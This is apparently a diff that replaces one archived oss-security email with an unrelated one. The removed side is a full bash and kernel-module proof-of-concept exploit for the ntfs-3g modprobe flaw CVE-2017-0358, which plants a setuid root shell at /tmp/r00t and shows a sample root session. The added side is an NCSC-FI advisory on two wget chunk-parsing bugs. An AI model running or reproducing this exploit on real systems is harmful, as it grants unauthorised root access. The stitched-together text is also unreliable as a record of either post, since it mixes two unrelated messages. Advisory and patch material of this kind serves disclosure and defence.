@@ -1,172 +1,95 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/02/04/1
-Message-ID: <CAPgP4gzYwuX9bdGR6vj774=1PY7Vhv3f1aSfZehB20h0mMoiyA@mail.gmail.com>
-Date: Fri, 3 Feb 2017 23:14:16 -0800
-From: Kristian Erik Hermansen <kristian.hermansen@...il.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/10/27/1
+Message-ID: <43bc647b-fc56-779c-bf11-99374e557e2a@ficora.fi>
+Date: Fri, 27 Oct 2017 11:21:35 +0300
+From: NCSC-FI Vulnerability Co-ordination <vulncoord@...ora.fi>
 To: oss-security@...ts.openwall.com
-Subject: Re: CVE-2017-0358 ntfs-3g: modprobe influence vulnerability via environment variables
+Cc: vulncoord@...ora.fi
+Subject: Two vulnerabilities patched in GNU Wget: CVE-2017-13089, CVE-2017-13090
 Content-Type: text/plain; charset=utf-8
 
-#!/bin/bash
-echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
-echo "@  CVE-2017-0359, PoC by Kristian Erik Hermansen  @"
-echo "@  ntfs-3g local privilege escalation to root     @"
-echo "@  Credits to Google Project Zero                 @"
-echo "@  Affects: Debian 9/8/7, Ubuntu, Gentoo, others  @"
-echo "@  Tested: Debian 9 (Stretch)                     @"
-echo "@  Date: 2017-02-03                               @"
-echo "@  Link: https://goo.gl/A9I8Vq                    @"
-echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
-echo "[*] Gathering environment info ..."
-cwd="$(pwd)"
-un="$(uname -r)"
-dlm="$(pwd)/lib/modules"
-dkf="$(pwd)/kernel/fs"
-echo "[*] Creating kernel hijack directories ..."
-mkdir -p "${dlm}"
-mkdir -p "${dkf}"
-echo "[*] Forging symlinks ..."
-ln -sf "${cwd}" "${dlm}/${un}"
-ln -sf "${cwd}" "${dkf}/fuse"
-ln -sf cve_2017_0358.ko fuse.ko
-echo "[*] Pulling in deps ... "
-echo "[*] Building kernel module ... "
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA512
 
-cat << 'EOF' > cve_2017_0358.c
-#include <linux/module.h>
+CVE-2017-13089:
 
-MODULE_LICENSE("CC");
-MODULE_AUTHOR("kristian erik hermansen
-<kristian.hermansen+CVE-2017-0358@...il.com>");
-MODULE_DESCRIPTION("PoC for CVE-2017-0358 from Google Project Zero");
+The http.c:skip_short_body() function is called in some circumstances,
+such as when processing redirects. When the response is sent chunked,
+the chunk parser uses strtol() to read each chunk's length, but
+doesn't check that the chunk length is a non-negative number. The
+code then tries to skip the chunk in pieces of 512 bytes by using the
+MIN() macro, but ends up passing the negative chunk length to
+connect.c:fd_read(). As fd_read() takes an int argument, the high
+32 bits of the chunk length are discarded, leaving fd_read() with
+a completely attacker controlled length argument.
 
-int init_module(void) {
-  printk(KERN_INFO "[!] Exploited CVE-2017-0358 successfully; may want
-to patch your system!\n");
-  char *envp[] = { "HOME=/tmp", NULL };
-  char *argv[] = { "/bin/sh", "-c", "/bin/cp /bin/sh /tmp/r00t;
-/bin/chmod u+s /tmp/r00t", NULL };
-  call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
-  char *argvv[] = { "/bin/sh", "-c", "/sbin/rmmod cve_2017_0358", NULL };
-  call_usermodehelper(argv[0], argvv, envp, UMH_WAIT_EXEC);
-  return 0;
-}
+Patch attached, original at:
 
-void cleanup_module(void) {
-  printk(KERN_INFO "[*] CVE-2017-0358 exploit unloading ...\n");
-}
-EOF
+http://git.savannah.gnu.org/cgit/wget.git/commit/?id=d892291fb8ace4c3b73
+4ea5125770989c215df3f
 
-cat << 'EOF' > Makefile
-obj-m += cve_2017_0358.o
+CVE-2017-13090:
 
-all:
-make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+The retr.c:fd_read_body() function is called when processing OK
+responses. When the response is sent chunked, the chunk parser uses
+strtol() to read each chunk's length, but doesn't check that the chunk
+length is a non-negative number. The code then tries to read the chunk
+in pieces of 8192 bytes by using the MIN() macro, but ends up passing
+the negative chunk length to retr.c:fd_read(). As fd_read() takes an
+int argument, the high 32 bits of the chunk length are discarded,
+leaving fd_read() with a completely attacker controlled length
+argument. The attacker can corrupt malloc metadata after the allocated
+buffer.
 
-clean:
-make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
-EOF
+Patch attached, original at:
 
-make 1>/dev/null 2>/dev/null || echo "[-] FAILED: your need make / build tools"
-cp "/lib/modules/${un}/modules.dep.bin" . || echo "[-] FAILED:
-linux-image location non-default?"
-MODPROBE_OPTIONS="-v -d ${cwd}" ntfs-3g /dev/null /dev/null
-1>/dev/null 2>/dev/null
-/tmp/r00t -c 'whoami' | egrep -q 'root' && echo "[+] SUCCESS: You have
-root. Don't be evil :)"
-/tmp/r00t
+http://git.savannah.gnu.org/cgit/wget.git/commit/?id=ba6b44f6745b14dce41
+4761a8e4b35d31b176bba
 
-echo << 'EOF'
-$ whoami
-user
-$ ./cve-2017-0358.sh
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@  CVE-2017-0359, PoC by Kristian Erik Hermansen  @
-@  ntfs-3g local privilege escalation to root     @
-@  Credits to Google Project Zero                 @
-@  Affects: Debian 9/8/7, Ubuntu, Gentoo, others  @
-@  Tested: Debian 9 (Stretch)                     @
-@  Date: 2017-02-03                               @
-@  Link: https://goo.gl/A9I8Vq                    @
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-[*] Gathering environment info ...
-[*] Creating kernel hijack directories ...
-[*] Forging symlinks ...
-[*] Pulling in deps ...
-[*] Building kernel module ...
-[+] SUCCESS: You have root. Don't be evil :)
-# whoami
-root
-EOF
+Reported by:
 
+Antti Levomäki, Christian Jalio, Joonas Pihlaja from Forcepoint
 
-On Tue, Jan 31, 2017 at 10:44 PM, Laszlo Boszormenyi (GCS)
-<gcs@...ian.org> wrote:
-> Hi,
->
-> Jann Horn, Project Zero (Google) discovered that ntfs-3g, a read-write
-> NTFS driver for FUSE does not not scrub the environment before
-> executing modprobe to load the fuse module. This influence the behavior
-> of modprobe (MODPROBE_OPTIONS environment variable, --config and
-> --dirname options) potentially allowing for local root privilege
-> escalation if ntfs-3g is installed setuid. This is the case for Debian,
-> Ubuntu and probably Gentoo.
->
-> This problem is in the source since 2008, maybe before.
-> The fix is easy, use execle instead of execl and pass NULL as
-> environment variables.
-> -- cut --
-> --- ntfs-3g/src/lowntfs-3g.c.ref        2016-12-31 08:56:59.011749600 +0100
-> +++ ntfs-3g/src/lowntfs-3g.c    2017-01-05 14:41:52.041473700 +0100
-> @@ -4291,13 +4291,14 @@
->         struct stat st;
->         pid_t pid;
->         const char *cmd = "/sbin/modprobe";
-> +       char *env = (char*)NULL;
->         struct timespec req = { 0, 100000000 };   /* 100 msec */
->         fuse_fstype fstype;
->
->         if (!stat(cmd, &st) && !geteuid()) {
->                 pid = fork();
->                 if (!pid) {
-> -                       execl(cmd, cmd, "fuse", NULL);
-> +                       execle(cmd, cmd, "fuse", NULL, &env);
->                         _exit(1);
->                 } else if (pid != -1)
->                         waitpid(pid, NULL, 0);
-> --- ntfs-3g/src/ntfs-3g.c.ref   2016-12-31 08:56:59.022518700 +0100
-> +++ ntfs-3g/src/ntfs-3g.c       2017-01-05 15:45:45.912499400 +0100
-> @@ -3885,13 +3885,14 @@
->         struct stat st;
->         pid_t pid;
->         const char *cmd = "/sbin/modprobe";
-> +       char *env = (char*)NULL;
->         struct timespec req = { 0, 100000000 };   /* 100 msec */
->         fuse_fstype fstype;
->
->         if (!stat(cmd, &st) && !geteuid()) {
->                 pid = fork();
->                 if (!pid) {
-> -                       execl(cmd, cmd, "fuse", NULL);
-> +                       execle(cmd, cmd, "fuse", NULL, &env);
->                         _exit(1);
->                 } else if (pid != -1)
->                         waitpid(pid, NULL, 0);
-> -- cut --
->
-> CVE-2017-0358 is assigned to this issue by Salvatore Bonaccorso,
-> Debian Security Team.
->
-> Regards,
-> Laszlo/GCS
+Advisory:
 
+https://www.viestintavirasto.fi/en/2017/haavoittuvuus-2017-037
 
+Also attached are JSON versions of the vulnerability details (in the
+CVE 4.0 schema as formatted by Vulnogram, https://vulnogram.github.io/).
 
--- 
 Regards,
 
-Kristian Erik Hermansen
-https://www.linkedin.com/in/kristianhermansen
-https://profiles.google.com/kristianerikhermansen
+- -Jussi / NCSC-FI
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v2.0.22 (GNU/Linux)
 
-View attachment "cve-2017-0358.sh.txt" of type "text/plain" (15934 bytes)
+iQIcBAEBCgAGBQJZ8uxpAAoJEABVfkgMlGK84+wP/0ADB7REF0a85RU3ScvhuwCB
+nyDzyoGy0bEFkN+Hia4sIZzSL6ea+EcngUw28A6tMuQGpgYqqKnrxybp39Pou/IU
+c1Bl/7Lci4PQRfc/XuhFE6NlqZlG9W7G4Yiijgv2sQNiaHzkIDxaUuahqQOI7AhQ
+WGdtBdFIYdBs9DogZuW+cURZ+3F1paPymQozGDQtdZClTL41+YhKbNki47tBzX+7
+GWndw3vt75ZGPsBDWFu1m4RUslmEG1+EU7cWYLTqo8+eTirnC9Lo2VS3fkJimdH1
+rJDjRCQ1xCiWNwJ4+wpzh2gm0CPlY5MU/1dr6mdGGRIcwqGcSfmEBMaOHTQGVt9b
+q2RDY3Otmh/98/3oeKlhyC2e7gyRO1D9i/SGgsCX2Xnfh6AnLg5I6P0xvSGtj/aK
+5V5/7q5+xu7OFEOwvgEAN77eYGYFIND6fBMqJFn8kxvac1uNd7ppixuCqsC0rxWE
+t1L73B/vFvuOL9G6tq62o8haT578vQj8HQ8/x39PtHzr2giDv4uC4bKCZx6CCKGl
+ZNfpTEucZrQDJq/8rtm047o5DGlOjTn+rflRhh2BdNDw6nnek605Ctney80YqFuF
+xYkQYSF9XkWcr/xTX1qD7vsMYhYlOqCui/3ej+S01yOVcRbTUSLVsF3jWm4QJlKa
+duMI7yGV2dxh4xjfSOoZ
+=fq73
+-----END PGP SIGNATURE-----
+
+Download attachment "CVE-2017-13089.json" of type "application/json" (2866 bytes)
+
+Download attachment "CVE-2017-13090.json" of type "application/json" (2900 bytes)
+
+View attachment "CVE-2017-13089.patch" of type "text/x-patch" (1085 bytes)
+
+View attachment "CVE-2017-13090.patch" of type "text/x-patch" (1159 bytes)
+
+Download attachment "CVE-2017-13089.json.sig" of type "application/pgp-signature" (543 bytes)
+
+Download attachment "CVE-2017-13090.json.sig" of type "application/pgp-signature" (543 bytes)
+
+Download attachment "CVE-2017-13089.patch.sig" of type "application/pgp-signature" (543 bytes)
+
+Download attachment "CVE-2017-13090.patch.sig" of type "application/pgp-signature" (543 bytes)
